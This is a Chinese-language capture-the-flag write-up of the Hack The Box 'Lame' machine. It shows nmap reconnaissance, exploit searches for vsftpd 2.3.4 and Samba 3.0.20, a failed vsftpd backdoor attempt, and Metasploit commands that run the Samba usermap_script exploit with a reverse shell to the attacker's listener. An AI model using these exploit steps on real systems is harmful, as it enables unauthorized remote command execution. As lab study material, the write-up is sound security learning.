# Lame

nmap扫描结果：

```shell
sudo nmap -T4 -A -v 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.27s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.28
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), Linux 2.6.23 (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Belkin N300 WAP (Linux 2.6.30) (91%), Control4 HC-300 home controller (91%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (91%), Dell Integrated Remote Access Controller (iDRAC5) (91%), Dell Integrated Remote Access Controller (iDRAC6) (91%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (91%), Linux 2.4.21 - 2.4.31 (likely embedded) (91%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.012 days (since Thu Sep  7 18:58:43 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=216 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-09-07T07:15:14-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h00m22s, deviation: 2h49m43s, median: 21s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   270.28 ms 10.10.14.1
2   270.36 ms 10.10.10.3

NSE: Script Post-scanning.
Initiating NSE at 19:15
Completed NSE at 19:15, 0.00s elapsed
Initiating NSE at 19:15
Completed NSE at 19:15, 0.00s elapsed
Initiating NSE at 19:15
Completed NSE at 19:15, 0.00s elapsed
Read data files from: /opt/homebrew/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.80 seconds
           Raw packets sent: 3104 (140.410KB) | Rcvd: 59 (3.316KB)

```



看看21端口的vsftp：

```shell
18:47:59 › searchsploit vsftp
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption       | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)       | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)       | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                     | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                            | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)               | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                              | multiple/remote/49719.py
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

msf测试：

```shell
msf6 > search vsftp

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.10.10.3       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```

再看一下smb服务，445端口是Samba 3.0.20-Debian。

```
Samba是在Linux和UNIX系统上实现，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。
```



```
19:10:28 › searchsploit Samba 3.0.20
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass               | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution  | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                        | linux_x86/dos/36741.py
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```



msf也找到了这个洞：

```shell
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set lhost 10.10.14.28
set lport 4444
exploit
```

然后可以在root目录和`/home/makis`下面找到flag。

这个洞根据描述感觉就是传入的用户名字符串最终进入了/bin/sh的里面，所以只要输入恶意字符串就可以rce。